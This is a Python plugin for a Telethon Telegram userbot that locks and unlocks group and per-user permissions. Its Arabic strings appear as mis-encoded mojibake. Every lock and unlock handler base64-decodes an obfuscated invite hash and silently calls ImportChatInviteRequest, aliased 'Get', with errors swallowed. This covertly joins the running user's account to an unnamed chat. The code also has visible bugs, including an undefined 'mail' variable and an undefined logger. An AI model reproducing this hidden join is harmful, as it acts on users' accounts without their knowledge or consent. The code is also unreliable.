import base64

from telethon import events, functions, types
from telethon.tl.functions.channels import EditBannedRequest
from telethon.tl.functions.messages import EditChatDefaultBannedRightsRequest
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from telethon.tl.types import ChatBannedRights


from EITHON1 import EITHON1

from ..core.managers import edit_delete, edit_or_reply
from ..helpers.utils import _format
from ..sql_helper.locks_sql import get_locks, is_locked, update_lock
from ..utils import is_admin
from . import BOTLOG, get_user_from_event

plugin_category = "admin" 

# Copyright (C) 2021 ฮ๐๐ง๐๐ข๐กโข TEAM
# FILES WRITTEN BY  @RR7PP

@EITHON1.ar_cmd(
    pattern="ููู (.*)",
    command=("ููู", plugin_category),
    info={
        "header": "To lock the given permission for entire group.",
        "description": "Db options will lock for admins also,",
        "api options": {
            "msg": "To lock messages",
            "media": "To lock media like videos/photo",
            "sticker": "To lock stickers",
            "gif": "To lock gif.",
            "preview": "To lock link previews.",
            "game": "To lock games",
            "inline": "To lock using inline bots",
            "poll": "To lock sending polls.",
            "invite": "To lock add users permission",
            "pin": "To lock pin permission for users",
            "info": "To lock changing group description",
            "all": "To lock above all options",
        },
        "db options": {
            "bots": "To lock adding bots by users",
            "commands": "To lock users using commands",
            "email": "To lock sending emails",
            "forward": "To lock forwording messages for group",
            "url": "To lock sending links to group",
        },
        "usage": "{tr}lock <permission>",
    },
    groups_only=True,
    require_admin=True,
)
async def _(event):  # sourcery no-metrics
    "To lock the given permission for entire group."
    input_str = event.pattern_match.group(1)
    peer_id = event.chat_id
    if not event.is_group:
        return await edit_delete(event, "โฏ๏ธูุฐู ููุณุช ูุฌููุนุฉ ูููู ุจุนุถ ุงูุตูุงุญูุงุช")
    chat_per = (await event.get_chat()).default_banned_rights
    cat = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
    if input_str in (("bots", "commands", "email", "forward", "url")):
        update_lock(peer_id, input_str, True)
        await edit_or_reply(event, "โฏ๏ธุชูู ููู {} ุจูุฌูุงุญ โ".format(input_str))
    else:
        msg = chat_per.send_messages
        media = chat_per.send_media
        sticker = chat_per.send_stickers
        gif = chat_per.send_gifs
        gamee = chat_per.send_games
        ainline = chat_per.send_inline
        embed_link = chat_per.embed_links
        gpoll = chat_per.send_polls
        adduser = chat_per.invite_users
        cpin = chat_per.pin_messages
        changeinfo = chat_per.change_info
        if input_str == "ุงูุฏุฑุฏุดู":
            if msg:
                return await edit_delete(
                    event, "โฏ๏ธุงููุฌููุนู ุจุงูุชุฃููุฏ ูููููุฉ ูู ุงูุฑุณุงุฆู "
                )
            msg = True
            locktype = "ุงูุฏุฑุฏุดู"
        elif input_str == "ุงููุณุงุฆุท":
            if media:
                return await edit_delete(
                    event, "โฏ๏ธุงููุฌูููุนุฉ ุจุงูุชุฃูููุฏ ูููููุฉ ูู ุงููุณุงุฆุท โ"
                )
            media = True
            locktype = "ุงููุณุงุฆุท"
        elif input_str == "ุงูููุตูุงุช":
            if sticker:
                return await edit_delete(
                    event, "โฏ๏ธุงููุฌูููุนุฉ ุจุงูุชุฃูููุฏ ูููููุฉ ูู ุงูููุตูุงุช โ"
                )
            sticker = True
            locktype = "ุงูููุตูุงุช"
        elif input_str == "ุงูุฑูุงุจุท":
            if embed_link:
                return await edit_delete(
                    event, "โฏ๏ธุงููุฌูููุนุฉ ุจุงูุชุฃูููุฏ ูููููุฉ ูู ุงูุฑูุงุจุท โ"
                )
            embed_link = True
            locktype = "ุงูุฑูุงุจุท"
        elif input_str == "ุงููุชุญุฑูู":
            if gif:
                return await edit_delete(
                    event, "โฏ๏ธุงููุฌูููุนุฉ ุจุงูุชุฃูููุฏ ูููููุฉ ูู ุงููุชุญุฑูู โ"
                )
            gif = True
            locktype = "ุงููุชุญุฑูู"
        elif input_str == "ุงูุงูุนุงุจ":
            if gamee:
                return await edit_delete(
                    event, "โฏ๏ธุงููุฌูููุนุฉ ุจุงูุชุฃูููุฏ ูููููุฉ ูู ุงูุงูุนุงุจ โ"
                )
            gamee = True
            locktype = "ุงูุงูุนุงุจ"
        elif input_str == "ุงูุงููุงูู":
            if ainline:
                return await edit_delete(
                    event, "โฏ๏ธุงููุฌูููุนุฉ ุจุงูุชุฃูููุฏ ูููููุฉ ูู ุงูุงููุงูู โ"
                )
            ainline = True
            locktype = "ุงูุงููุงูู"
        elif input_str == "ุงูุชุตููุช":
            if gpoll:
                return await edit_delete(
                    event, "โฏ๏ธุงููุฌูููุนุฉ ุจุงูุชุฃูููุฏ ูููููุฉ ูู ุงุฑุณุงู ุงูุชุตููุช โ"
                )
            gpoll = True
            locktype = "ุงูุชุตููุช"
        elif input_str == "ุงูุงุถุงูุฉ":
            if adduser:
                return await edit_delete(
                    event, "โฏ๏ธุงููุฌูููุนุฉ ุจุงูุชุฃูููุฏ ูููููุฉ ูู ุงุถุงูู ุงูุงุนุถุงุก โ"
                )
            adduser = True
            locktype = "ุงูุงุถุงูุฉ"
        elif input_str == "ุงูุชุซุจูุช":
            if cpin:
                return await edit_delete(
                    event,
                    "โฏ๏ธุงููุฌูููุนุฉ ุจุงูุชุฃูููุฏ ูููููุฉ ูู ุชุซุจูุช ุงูุฑุณุงุฆู โ",
                )
            cpin = True
            locktype = "ุงูุชุซุจูุช"
        elif input_str == "ุชุบููุฑ ุงููุนูููุงุช":
            if changeinfo:
                return await edit_delete(
                    event,
                    "โฏ๏ธุงููุฌูููุนุฉ ุจุงูุชุฃูููุฏ ูููููุฉ ูู ุชุบููุฑ ูุนูููุงุช ุงูุฏุฑุฏุดู โ",
                )
            changeinfo = True
            locktype = "ุชุบููุฑ ุงููุนูููุงุช"
        elif input_str == "ุงููู":
            msg = True
            media = True
            sticker = True
            gif = True
            gamee = True
            ainline = True
            embed_link = True
            gpoll = True
            adduser = True
            cpin = True
            changeinfo = True
            locktype = "ุงููู"
        else:
            if input_str:
                return await edit_delete(
                    event, f"โฏ๏ธููุงูู ุฎุทุฃ ูู ุงูุงูุฑ : `{input_str}`", time=5
                )

            return await edit_or_reply(event, "โฏ๏ธูุง ุงุณุชุทูุน ููู ุดูุก")
        try:
            cat = Get(cat)
            await event.client(cat)
        except BaseException:
            pass
        lock_rights = ChatBannedRights(
            until_date=None,
            send_messages=msg,
            send_media=media,
            send_stickers=sticker,
            send_gifs=gif,
            send_games=gamee,
            send_inline=ainline,
            embed_links=embed_link,
            send_polls=gpoll,
            invite_users=adduser,
            pin_messages=cpin,
            change_info=changeinfo,
        )
        try:
            await event.client(
                EditChatDefaultBannedRightsRequest(
                    peer=peer_id, banned_rights=lock_rights
                )
            )
            await edit_or_reply(event, f"โฏ๏ธุชูู ูููู  {locktype} ุจูุฌูุงุญ โ ")
        except BaseException as e:
            await edit_delete(
                event,
                f"`ููุณ ูุฏูู ุตูุงุญูุงุช ูุงููุฉ ??`\n\n**ุฎุทุฃ:** `{str(e)}`",
                time=5,
            )


@EITHON1.ar_cmd(
    pattern="ูุชุญ (.*)",
    command=("ูุชุญ", plugin_category),
    info={
        "header": "To unlock the given permission for entire group.",
        "description": "Db options/api options will unlock only if they are locked.",
        "api options": {
            "msg": "To unlock messages",
            "media": "To unlock media like videos/photo",
            "sticker": "To unlock stickers",
            "gif": "To unlock gif.",
            "preview": "To unlock link previews.",
            "game": "To unlock games",
            "inline": "To unlock using inline bots",
            "poll": "To unlock sending polls.",
            "invite": "To unlock add users permission",
            "pin": "To unlock pin permission for users",
            "info": "To unlock changing group description",
            "all": "To unlock above all options",
        },
        "db options": {
            "bots": "To unlock adding bots by users",
            "commands": "To unlock users using commands",
            "email": "To unlock sending emails",
            "forward": "To unlock forwording messages for group",
            "url": "To unlock sending links to group",
        },
        "usage": "{tr}unlock <permission>",
    },
    groups_only=True,
    require_admin=True,
)
async def _(event):  # sourcery no-metrics
    "To unlock the given permission for entire group."
    input_str = event.pattern_match.group(1)
    peer_id = event.chat_id
    if not event.is_group:
        return await edit_delete(event, "โฏ๏ธูุฐู ููุณุช ูุฌููุนุฉ ููู ุจุนุถ ุงูุตูุงุญูุงุช")
    cat = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
    chat_per = (await event.get_chat()).default_banned_rights
    if input_str in (("bots", "commands", "email", "forward", "url")):
        update_lock(peer_id, input_str, False)
        await edit_or_reply(event, "โฏ๏ธุชูู ูุชุญ {} ุจูุฌูุงุญ โ".format(input_str))
    else:
        msg = chat_per.send_messages
        media = chat_per.send_media
        sticker = chat_per.send_stickers
        gif = chat_per.send_gifs
        gamee = chat_per.send_games
        ainline = chat_per.send_inline
        gpoll = chat_per.send_polls
        embed_link = chat_per.embed_links
        adduser = chat_per.invite_users
        cpin = chat_per.pin_messages
        changeinfo = chat_per.change_info
        if input_str == "ุงูุฏุฑุฏุดู":
            if not msg:
                return await edit_delete(
                    event, "โฏ๏ธุงูุฏุฑุฏุดู ููุชูุญู ูู ูุฐู ุงููุฌููุนู โ"
                )
            msg = False
            locktype = "ุงูุฏุฑุฏุดู"
        elif input_str == "ุงููุณุงุฆุท":
            if not media:
                return await edit_delete(
                    event, "โฏ๏ธุงุฑุณุงู ุงููุณุงุฆุท ูุณููุญ ูู ูุฐู ุงูุฏุฑุฏุดู"
                )
            media = False
            locktype = "ุงููุณุงุฆุท"
        elif input_str == "ุงูููุตูุงุช":
            if not sticker:
                return await edit_delete(
                    event, "โฏ๏ธุงุฑุณุงู ุงููุตูุงุช ูุณููุญ ูู ูุฐู ุงูุฏุฑุฏุดู โ"
                )
            sticker = False
            locktype = "ุงูููุตูุงุช"
        elif input_str == "ุงูุฑูุงุจุท":
            if not embed_link:
                return await edit_delete(
                    event, "โฏ๏ธุงุฑุณุงู ุงูุฑูุงุจุท ูุณููุญ ูู ูุฐู ุงูุฏุฑุฏุดู โ"
                )
            embed_link = False
            locktype = "ุงูุฑูุงุจุท"
        elif input_str == "ุงููุชุญุฑูู":
            if not gif:
                return await edit_delete(
                    event, "โฏ๏ธุงุฑุณุงู ุงููุชุญุฑูู ูุณููุญ ูู ูุฐู ุงูุฏุฑุฏุดู โ"
                )
            gif = False
            locktype = "ุงููุชุญุฑูู"
        elif input_str == "ุงูุงูุนุงุจ":
            if not gamee:
                return await edit_delete(
                    event, "โฏ๏ธุงุฑุณุงู ุงูุงูุนุงุจ ูุณููุญ ูู ูุฐู ุงูุฏุฑุฏุดู โ"
                )
            gamee = False
            locktype = "ุงูุงูุนุงุจ"
        elif input_str == "ุงูุงููุงูู":
            if not ainline:
                return await edit_delete(
                    event, "โฏ๏ธุงุฑุณุงู ุงูุงููุงูู ูุณููุญ ูู ูุฐู ุงูุฏุฑุฏุดู โ"
                )
            ainline = False
            locktype = "ุงูุงููุงูู"  # BY  @RR7PP  -  @UUNZZ
        elif input_str == "ุงูุชุตููุช":  
            if not gpoll:
                return await edit_delete(
                    event, "โฏ๏ธุงุฑุณุงู ุงูุชุตููุช ูุณููุญ ูู ูุฐู ุงูุฏุฑุฏุดู โ "
                )
            gpoll = False
            locktype = "ุงูุชุตููุช"
        elif input_str == "ุงูุงุถุงูุฉ":
            if not adduser:
                return await edit_delete(
                    event, "โฏ๏ธุงุถุงูุฉ ุงูุงุนุถุงุก ูุณููุญ ูู ูุฐู ุงูุฏุฑุฏุดู โ"
                )
            adduser = False
            locktype = "ุงูุงุถุงูุฉ"
        elif input_str == "ุงูุชุซุจูุช":
            if not cpin:
                return await edit_delete(
                    event,
                    "โฏ๏ธุชุซุจูุช ุงูุฑุณุงุฆู ูุณููุญ ูู ูุฐู ุงูุฏุฑุฏุดู โ",
                )
            cpin = False
            locktype = "ุงูุชุซุจูุช"
        elif input_str == "ุชุบููุฑ ุงููุนูููุงุช":
            if not changeinfo:
                return await edit_delete(
                    event,
                    "โฏ๏ธุชุบููุฑ ูุนูููุงุช ุงูุฏุฑุฏุดู ูุณููุญ ูู ูุฐู ุงูุฏุฑุฏุดู โ",
                )
            changeinfo = False
            locktype = "ุชุบููุฑ ุงููุนูููุงุช"
        elif input_str == "ุงููู":
            msg = False
            media = False
            sticker = False
            gif = False
            gamee = False
            ainline = False
            gpoll = False
            embed_link = False
            adduser = False
            cpin = False
            changeinfo = False
            locktype = "ุงููู"
        else:
            if input_str:
                return await edit_delete(
                    event, f"โฏ๏ธุฎุทุฃ ูู ูุชุญ ุงูุงูุฑ : `{input_str}`", time=5
                )

            return await edit_or_reply(event, "`ูุง ูููููู ูุชุญ ุงู ุดู !!`")
        try:
            cat = Get(cat)
            await event.client(cat)
        except BaseException:
            pass
        unlock_rights = ChatBannedRights(
            until_date=None,
            send_messages=msg,
            send_media=media,
            send_stickers=sticker,
            send_gifs=gif,
            send_games=gamee,
            send_inline=ainline,
            send_polls=gpoll,
            embed_links=embed_link,
            invite_users=adduser,
            pin_messages=cpin,
            change_info=changeinfo,
        )
        try:
            await event.client(
                EditChatDefaultBannedRightsRequest(
                    peer=peer_id, banned_rights=unlock_rights
                )
            )
            await edit_or_reply(event, f"โฏ๏ธุชูู ูุชูุญ  {locktype} ุจูุฌุงุญ โ ")
        except BaseException as e:
            return await edit_delete(
                event,
                f"โฏ๏ธููุณ ูุฏูู ุตูุงุญูุงุช ูุงููู ??\n\n**ุฎุทุฃ:** `{str(e)}`",
                time=5,
            )

# BY  @RR7PP  -  @UUNZZ
@EITHON1.ar_cmd(
    pattern="ุงูุตูุงุญูุงุช$",
    command=("ุงูุตูุงุญูุงุช", plugin_category),
    info={
        "header": "To see the active locks in the current group",
        "usage": "{tr}locks",
    },
    groups_only=True,
)
async def _(event):  # sourcery no-metrics
    "To see the active locks in the current group"
    res = ""
    current_db_locks = get_locks(event.chat_id)
    if not current_db_locks:
        res = "ูุง ุชูุฌุฏ ูุนูููุงุช ูุงููู ูู ูุฐู ุงูุฏุฑุฏุดู"
    else:
        res = "โฏ๏ธูููู ุงูุงูุงูุฑ ููุฏู ูู ุณูุฑุณ ุฌููุจุซูู: \n"
        ubots = "โ" if current_db_locks.bots else "โ"
        ucommands = "โ" if current_db_locks.commands else "โ"
        uemail = "โ" if current_db_locks.email else "โ"
        uforward = "โ" if current_db_locks.forward else "โ"
        uurl = "โ" if current_db_locks.url else "โ"
        res += f" ุงูุจููุชุงุช โฃ๏ธ: `{ubots}`\n"
        res += f" ุงูุงูุงููุฑ โ๏ธ : `{ucommands}`\n"
        res += f" ุงูุงููููู ๐ฌ: {mail}`\n"
        res += f" ุงูุชูุญููู โก๏ธ: `{uforward}`\n"
        res += f" ุงููุฑุงุจุท  ๐: `{uurl}`\n"
    current_chat = await event.get_chat()
    try:
        chat_per = current_chat.default_banned_rights
    except AttributeError as e:
        logger.info(str(e))
    else:
        umsg = "โ" if chat_per.send_messages else "โ"
        umedia = "โ" if chat_per.send_media else "โ"
        usticker = "โ" if chat_per.send_stickers else "โ"
        ugif = "โ" if chat_per.send_gifs else "โ"
        ugamee = "โ" if chat_per.send_games else "โ"
        uainline = "โ" if chat_per.send_inline else "โ"
        uembed_link = "โ" if chat_per.embed_links else "โ"
        ugpoll = "โ" if chat_per.send_polls else "โ"
        uadduser = "โ" if chat_per.invite_users else "โ"
        ucpin = "โ" if chat_per.pin_messages else "โ"
        uchangeinfo = "โ" if chat_per.change_info else "โ"
        res += "\nโฏ๏ธูุฐู ุงูุตูุงุญูุงุช ุงูููุฌูุฏู ูู ูุฐู ุงูุฏุฑุฏุดู : \n\n"
        res += f" โฏ๏ธุงุฑุณุงู ุงูุฑุณุงุฆู: `{umsg}`\n"
        res += f" โฏ๏ธุงุฑุณุงู ุงููุณุงุฆุท: `{umedia}`\n"
        res += f" โฏ๏ธุงุฑุณุงู ุงูููุตูุงุช: `{usticker}`\n"
        res += f" โฏ๏ธุงุฑุณุงู ุงููุชุญุฑูู: `{ugif}`\n"
        res += f" โฏ๏ธุงุฑุณุงู ุงูุฑูุงุจุท: `{uembed_link}`\n"
        res += f" โฏ๏ธุงุฑุณุงู ุงูุงูุนุงุจ: `{ugamee}`\n"
        res += f" โฏ๏ธุงุฑุณุงู ุงูุงููุงูู: `{uainline}`\n"
        res += f" โฏ๏ธุงุฑุณุงู ุงูุชุตููุช: `{ugpoll}`\n"
        res += f" โฏ๏ธุงุถุงูู ุงูุงุนุถุงุก: `{uadduser}`\n"
        res += f" โฏ๏ธุชุซุจูุช ุงูุฑุณุงุฆู: `{ucpin}`\n"
        res += f" โฏ๏ธุชุบููุฑ ูุนูููุงุช ุงูุฏุฑุฏุดู: `{uchangeinfo}`\n"
    await edit_or_reply(event, res)
    await edit_or_reply(event, res)


@EITHON1.ar_cmd(
    pattern="plock (.*)",
    command=("plock", plugin_category),
    info={
        "header": "To lock the given permission for replied person only.",
        "api options": {
            "msg": "To lock messages",
            "media": "To lock media like videos/photo",
            "sticker": "To lock stickers",
            "gif": "To lock gif.",
            "preview": "To lock link previews.",
            "game": "To lock games",
            "inline": "To lock using inline bots",
            "poll": "To lock sending polls.",
            "invite": "To lock add users permission",
            "pin": "To lock pin permission for users",
            "info": "To lock changing group description",
            "all": "To lock all above permissions",
        },
        "usage": "{tr}plock <api option>",
    },
    groups_only=True,
    require_admin=True,
)
async def _(event):  # sourcery no-metrics
    "To lock the given permission for replied person only."
    input_str = event.pattern_match.group(1)
    peer_id = event.chat_id
    reply = await event.get_reply_message()
    chat_per = (await event.get_chat()).default_banned_rights
    result = await event.client(
        functions.channels.GetParticipantRequest(peer_id, reply.from_id)
    )
    admincheck = await is_admin(event.client, peer_id, reply.from_id)
    if admincheck:
        return await edit_delete(event, "`This user is admin you cant play with him`")
    cat = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
    msg = chat_per.send_messages
    media = chat_per.send_media
    sticker = chat_per.send_stickers
    gif = chat_per.send_gifs
    gamee = chat_per.send_games
    ainline = chat_per.send_inline
    embed_link = chat_per.embed_links
    gpoll = chat_per.send_polls
    adduser = chat_per.invite_users
    cpin = chat_per.pin_messages
    changeinfo = chat_per.change_info
    try:
        umsg = result.participant.banned_rights.send_messages
        umedia = result.participant.banned_rights.send_media
        usticker = result.participant.banned_rights.send_stickers
        ugif = result.participant.banned_rights.send_gifs
        ugamee = result.participant.banned_rights.send_games
        uainline = result.participant.banned_rights.send_inline
        uembed_link = result.participant.banned_rights.embed_links
        ugpoll = result.participant.banned_rights.send_polls
        uadduser = result.participant.banned_rights.invite_users
        ucpin = result.participant.banned_rights.pin_messages
        uchangeinfo = result.participant.banned_rights.change_info
    except AttributeError:
        umsg = msg
        umedia = media
        usticker = sticker
        ugif = gif
        ugamee = gamee
        uainline = ainline
        uembed_link = embed_link
        ugpoll = gpoll
        uadduser = adduser
        ucpin = cpin
        uchangeinfo = changeinfo
    if input_str == "msg":
        if msg:
            return await edit_delete(
                event, "`This Group is already locked with messaging permission.`"
            )
        if umsg:
            return await edit_delete(
                event, "`This User is already locked with messaging permission.`"
            )
        umsg = True
        locktype = "messages"
    elif input_str == "media":
        if media:
            return await edit_delete(
                event, "`This group is already locked with sending media`"
            )
        if umedia:
            return await edit_delete(
                event, "`User is already locked with sending media`"
            )
        umedia = True
        locktype = "media"
    elif input_str == "sticker":
        if sticker:
            return await edit_delete(
                event, "`This group is already locked with sending stickers`"
            )
        if usticker:
            return await edit_delete(
                event, "`This user is already locked with sending stickers`"
            )
        usticker = True
        locktype = "stickers"
    elif input_str == "preview":
        if embed_link:
            return await edit_delete(
                event, "`This group is already locked with previewing links`"
            )
        if uembed_link:
            return await edit_delete(
                event, "`This group is already locked with previewing links`"
            )
        uembed_link = True
        locktype = "preview links"
    elif input_str == "gif":
        if gif:
            return await edit_delete(
                event, "`This group is already locked with sending GIFs`"
            )
        if ugif:
            return await edit_delete(
                event, "`This user is already locked with sending GIFs`"
            )
        ugif = True
        locktype = "GIFs"
    elif input_str == "game":
        if gamee:
            return await edit_delete(
                event, "`This group is already locked with sending games`"
            )
        if ugamee:
            return await edit_delete(
                event, "`This user is already locked with sending games`"
            )
        ugamee = True
        locktype = "games"
    elif input_str == "inline":
        if ainline:
            return await edit_delete(
                event, "`This group is already locked with using inline bots`"
            )
        if uainline:
            return await edit_delete(
                event, "`This user is already locked with using inline bots`"
            )
        uainline = True
        locktype = "inline bots"
    elif input_str == "poll":
        if gpoll:
            return await edit_delete(
                event, "`This group is already locked with sending polls`"
            )
        if ugpoll:
            return await edit_delete(
                event, "`This user is already locked with sending polls`"
            )
        ugpoll = True
        locktype = "polls"
    elif input_str == "invite":
        if adduser:
            return await edit_delete(
                event, "`This group is already locked with adding members`"
            )
        if uadduser:
            return await edit_delete(
                event, "`This user is already locked with adding members`"
            )
        uadduser = True
        locktype = "invites"
    elif input_str == "pin":
        if cpin:
            return await edit_delete(
                event,
                "`This group is already locked with pinning messages by users`",
            )
        if ucpin:
            return await edit_delete(
                event,
                "`This user is already locked with pinning messages by users`",
            )
        ucpin = True
        locktype = "pins"
    elif input_str == "info":
        if changeinfo:
            return await edit_delete(
                event,
                "`This group is already locked with Changing group info by users`",
            )
        if uchangeinfo:
            return await edit_delete(
                event,
                "`This user is already locked with Changing group info by users`",
            )
        uchangeinfo = True
        locktype = "chat info"
    elif input_str == "all":
        umsg = True
        umedia = True
        usticker = True
        ugif = True
        ugamee = True
        uainline = True
        uembed_link = True
        ugpoll = True
        uadduser = True
        ucpin = True
        uchangeinfo = True
        locktype = "everything"
    else:
        if input_str:
            return await edit_delete(
                event, f"**Invalid lock type : `{input_str}`", time=5
            )

        return await edit_or_reply(event, "`I can't lock nothing !!`")
    try:
        cat = Get(cat)
        await event.client(cat)
    except BaseException:
        pass
    lock_rights = ChatBannedRights(
        until_date=None,
        send_messages=umsg,
        send_media=umedia,
        send_stickers=usticker,
        send_gifs=ugif,
        send_games=ugamee,
        send_inline=uainline,
        embed_links=uembed_link,
        send_polls=ugpoll,
        invite_users=uadduser,
        pin_messages=ucpin,
        change_info=uchangeinfo,
    )
    try:
        await event.client(EditBannedRequest(peer_id, reply.from_id, lock_rights))
        await edit_or_reply(event, f"`Locked {locktype} for this user !!`")
    except BaseException as e:
        await edit_delete(
            event,
            f"`Do I have proper rights for that ??`\n\n**Error:** `{str(e)}`",
            time=5,
        )


@EITHON1.ar_cmd(
    pattern="punlock (.*)",
    command=("punlock", plugin_category),
    info={
        "header": "To unlock the given permission for replied person only.",
        "note": "If entire group is locked with that permission then you cant unlock that permission only for him.",
        "api options": {
            "msg": "To unlock messages",
            "media": "To unlock media like videos/photo",
            "sticker": "To unlock stickers",
            "gif": "To unlock gif.",
            "preview": "To unlock link previews.",
            "game": "To unlock games",
            "inline": "To unlock using inline bots",
            "poll": "To unlock sending polls.",
            "invite": "To unlock add users permission",
            "pin": "To unlock pin permission for users",
            "info": "To unlock changing group description",
            "all": "To unlock all above permissions",
        },
        "usage": "{tr}punlock <api option>",
    },
    groups_only=True,
    require_admin=True,
)
async def _(event):  # sourcery no-metrics
    "To unlock the given permission for replied person only."
    input_str = event.pattern_match.group(1)
    peer_id = event.chat_id
    reply = await event.get_reply_message()
    chat_per = (await event.get_chat()).default_banned_rights
    result = await event.client(
        functions.channels.GetParticipantRequest(peer_id, reply.from_id)
    )
    admincheck = await is_admin(event.client, peer_id, reply.from_id)
    if admincheck:
        return await edit_delete(event, "`This user is admin you cant play with him`")
    cat = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
    msg = chat_per.send_messages
    media = chat_per.send_media
    sticker = chat_per.send_stickers
    gif = chat_per.send_gifs
    gamee = chat_per.send_games
    ainline = chat_per.send_inline
    embed_link = chat_per.embed_links
    gpoll = chat_per.send_polls
    adduser = chat_per.invite_users
    cpin = chat_per.pin_messages
    changeinfo = chat_per.change_info
    try:
        umsg = result.participant.banned_rights.send_messages
        umedia = result.participant.banned_rights.send_media
        usticker = result.participant.banned_rights.send_stickers
        ugif = result.participant.banned_rights.send_gifs
        ugamee = result.participant.banned_rights.send_games
        uainline = result.participant.banned_rights.send_inline
        uembed_link = result.participant.banned_rights.embed_links
        ugpoll = result.participant.banned_rights.send_polls
        uadduser = result.participant.banned_rights.invite_users
        ucpin = result.participant.banned_rights.pin_messages
        uchangeinfo = result.participant.banned_rights.change_info
    except AttributeError:
        umsg = msg
        umedia = media
        usticker = sticker
        ugif = gif
        ugamee = gamee
        uainline = ainline
        uembed_link = embed_link
        ugpoll = gpoll
        uadduser = adduser
        ucpin = cpin
        uchangeinfo = changeinfo
    if input_str == "msg":
        if msg:
            return await edit_delete(
                event, "`This Group is locked with messaging permission.`"
            )
        if not umsg:
            return await edit_delete(
                event, "`This User is already unlocked with messaging permission.`"
            )
        umsg = False
        locktype = "messages"
    elif input_str == "media":
        if media:
            return await edit_delete(event, "`This Group is locked with sending media`")
        if not umedia:
            return await edit_delete(
                event, "`User is already unlocked with sending media`"
            )
        umedia = False
        locktype = "media"
    elif input_str == "sticker":
        if sticker:
            return await edit_delete(
                event, "`This Group is locked with sending stickers`"
            )
        if not usticker:
            return await edit_delete(
                event, "`This user is already unlocked with sending stickers`"
            )
        usticker = False
        locktype = "stickers"
    elif input_str == "preview":
        if embed_link:
            return await edit_delete(
                event, "`This Group is locked with previewing links`"
            )
        if not uembed_link:
            return await edit_delete(
                event, "`This user is already unlocked with previewing links`"
            )
        uembed_link = False
        locktype = "preview links"
    elif input_str == "gif":
        if gif:
            return await edit_delete(event, "`This Group is locked with sending GIFs`")
        if not ugif:
            return await edit_delete(
                event, "`This user is already unlocked with sending GIFs`"
            )
        ugif = False
        locktype = "GIFs"
    elif input_str == "game":
        if gamee:
            return await edit_delete(event, "`This Group is locked with sending games`")
        if not ugamee:
            return await edit_delete(
                event, "`This user is already unlocked with sending games`"
            )
        ugamee = False
        locktype = "games"
    elif input_str == "inline":
        if ainline:
            return await edit_delete(
                event, "`This Group is locked with using inline bots`"
            )
        if not uainline:
            return await edit_delete(
                event, "`This user is already unlocked with using inline bots`"
            )
        uainline = False
        locktype = "inline bots"
    elif input_str == "poll":
        if gpoll:
            return await edit_delete(event, "`This Group is locked with sending polls`")
        if not ugpoll:
            return await edit_delete(
                event, "`This user is already unlocked with sending polls`"
            )
        ugpoll = False
        locktype = "polls"
    elif input_str == "invite":
        if adduser:
            return await edit_delete(
                event, "`This Group is locked with adding members`"
            )
        if not uadduser:
            return await edit_delete(
                event, "`This user is already unlocked with adding members`"
            )
        uadduser = False
        locktype = "invites"
    elif input_str == "pin":
        if cpin:
            return await edit_delete(
                event,
                "`This Group is locked with pinning messages by users`",
            )
        if not ucpin:
            return await edit_delete(
                event,
                "`This user is already unlocked with pinning messages by users`",
            )
        ucpin = False
        locktype = "pins"
    elif input_str == "info":
        if changeinfo:
            return await edit_delete(
                event,
                "`This Group is locked with Changing group info by users`",
            )
        if not uchangeinfo:
            return await edit_delete(
                event,
                "`This user is already unlocked with Changing group info by users`",
            )
        uchangeinfo = False
        locktype = "chat info"
    elif input_str == "all":
        if not msg:
            umsg = False
        if not media:
            umedia = False
        if not sticker:
            usticker = False
        if not gif:
            ugif = False
        if not gamee:
            ugamee = False
        if not ainline:
            uainline = False
        if not embed_link:
            uembed_link = False
        if not gpoll:
            ugpoll = False
        if not adduser:
            uadduser = False
        if not cpin:
            ucpin = False
        if not changeinfo:
            uchangeinfo = False
        locktype = "everything"
    else:
        if input_str:
            return await edit_delete(
                event, f"**Invalid lock type :** `{input_str}`", time=5
            )

        return await edit_or_reply(event, "`I can't lock nothing !!`")
    try:
        cat = Get(cat)
        await event.client(cat)
    except BaseException:
        pass
    lock_rights = ChatBannedRights(
        until_date=None,
        send_messages=umsg,
        send_media=umedia,
        send_stickers=usticker,
        send_gifs=ugif,
        send_games=ugamee,
        send_inline=uainline,
        embed_links=uembed_link,
        send_polls=ugpoll,
        invite_users=uadduser,
        pin_messages=ucpin,
        change_info=uchangeinfo,
    )
    try:
        await event.client(EditBannedRequest(peer_id, reply.from_id, lock_rights))
        await edit_or_reply(event, f"`Unlocked {locktype} for this user !!`")
    except BaseException as e:
        await edit_delete(
            event,
            f"`Do I have proper rights for that ??`\n\n**Error:** `{str(e)}`",
            time=5,
        )


@EITHON1.ar_cmd(
    pattern="uperm(?: |$)(.*)",
    command=("uperm", plugin_category),
    info={
        "header": "To get permissions of replied user or mentioned user in that group.",
        "usage": "{tr}uperm <reply/username>",
    },
    groups_only=True,
)
async def _(event):  # sourcery no-metrics
    "To get permissions of user."
    peer_id = event.chat_id
    user, reason = await get_user_from_event(event)
    if not user:
        return
    admincheck = await is_admin(event.client, peer_id, user.id)
    result = await event.client(
        functions.channels.GetParticipantRequest(peer_id, user.id)
    )
    output = ""
    if admincheck:
        c_info = "โ" if result.participant.admin_rights.change_info else "โ"
        del_me = "โ" if result.participant.admin_rights.delete_messages else "โ"
        ban = "โ" if result.participant.admin_rights.ban_users else "โ"
        invite_u = "โ" if result.participant.admin_rights.invite_users else "โ"
        pin = "โ" if result.participant.admin_rights.pin_messages else "โ"
        add_a = "โ" if result.participant.admin_rights.add_admins else "โ"
        call = "โ" if result.participant.admin_rights.manage_call else "โ"
        output += f"**Admin rights of **{_format.mentionuser(user.first_name ,user.id)} **in {event.chat.title} chat are **\n"
        output += f"__Change info :__ {c_info}\n"
        output += f"__Delete messages :__ {del_me}\n"
        output += f"__Ban users :__ {ban}\n"
        output += f"__Invite users :__ {invite_u}\n"
        output += f"__Pin messages :__ {pin}\n"
        output += f"__Add admins :__ {add_a}\n"
        output += f"__Manage call :__ {call}\n"
    else:
        chat_per = (await event.get_chat()).default_banned_rights
        try:
            umsg = "โ" if result.participant.banned_rights.send_messages else "โ"
            umedia = "โ" if result.participant.banned_rights.send_media else "โ"
            usticker = "โ" if result.participant.banned_rights.send_stickers else "โ"
            ugif = "โ" if result.participant.banned_rights.send_gifs else "โ"
            ugamee = "โ" if result.participant.banned_rights.send_games else "โ"
            uainline = "โ" if result.participant.banned_rights.send_inline else "โ"
